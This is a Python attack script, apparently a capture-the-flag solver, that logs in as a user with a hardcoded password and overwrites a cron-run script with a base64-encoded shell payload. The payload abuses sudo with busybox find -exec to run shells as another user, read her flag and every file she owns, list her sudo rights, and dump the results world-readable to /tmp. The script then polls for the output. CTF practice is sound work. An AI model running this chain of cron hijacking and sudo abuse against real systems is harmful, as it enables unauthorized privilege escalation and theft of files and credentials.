"""Chain 3b: cron payload -> sunstalker runs busybox `find` -> lilith.

Fixes the `-exec ... ;` quoting bug (the trailing `;` must be `\\;` or the
shell terminates the command before find sees the terminator).
"""
import asyncio
import base64
import os
import re
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402

GHOST_PW = "Gh0stInTh3Sh3ll_404"

PAYLOAD = r"""#!/bin/sh
{
echo "=== cron-time: $(date) ==="
echo "=== as ==="; id
echo "=== lilith: id + flag ==="
sudo -n -u lilith /usr/bin/find /etc -maxdepth 1 -name passwd \
  -exec /bin/sh -c 'echo LILITH-EXEC; id; cat /home/lilith/flag.txt; echo LILITH-END' \;
echo "=== lilith: every file she owns ==="
sudo -n -u lilith /usr/bin/find /home/lilith -type f \
  -exec /bin/sh -c 'echo "--- $1"; cat "$1" 2>/dev/null; echo LILITH-END' _ {} \;
echo "=== lilith: sudo -l ==="
sudo -n -u lilith /usr/bin/find /etc/hostname \
  -exec /bin/sh -c 'sudo -n -l; echo SUDO-END' \;
echo "=== sunstalker handoff ==="
cat /home/sunstalker/handoff.txt 2>/dev/null
} > /tmp/lilith_dump.txt 2>&1
chmod 666 /tmp/lilith_dump.txt
"""


def ff_clean(s):
    s = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", s)
    return s.replace("\x1b[?2004l", "").replace("\x1b[?2004h", "").strip()


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    return ff_clean("\n".join(l for l in buf.splitlines() if tag not in l)), ok


async def su_to(sh, user, password):
    await sh.send(f"su - {user}")
    got, _ = await wait_for(sh, "Password:", 25.0)
    if not got:
        return False
    await sh.send(password)
    await asyncio.sleep(3.0)
    await sh.read(2.0)
    who, _ = await cmd(sh, "id", 25)
    return user in who


async def body(sh):
    await sh.read(5.0)
    if not await su_to(sh, "gh0st404", GHOST_PW):
        print("[!] su gh0st404 failed", flush=True)
        return False
    print("as:", (await cmd(sh, "whoami"))[0], flush=True)

    b64 = base64.b64encode(PAYLOAD.encode()).decode()
    _, ok2 = await cmd(sh, f"echo {b64} | base64 -d > /opt/scrape/collect.sh", 25)
    _, ok3 = await cmd(sh, "chmod 755 /opt/scrape/collect.sh && rm -f /tmp/lilith_dump.txt && echo READY", 15)
    print("planted:", ok2, ok3, flush=True)

    for i in range(13):
        await asyncio.sleep(10)
        out, ok = await cmd(sh, "cat /tmp/lilith_dump.txt 2>/dev/null; echo scan_done", 30)
        if "cron-time:" in out:
            print(f"\n[cron fired ~{(i+1)*10}s]", flush=True)
            print(out, flush=True)
            return True
        print(f"  ...waiting ({(i+1)*10}s)", flush=True)
    print("[!] no cron output", flush=True)
    return False


async def main():
    for attempt in range(1, 4):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                return
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}: {e}", flush=True)
        await asyncio.sleep(6)


asyncio.run(main())
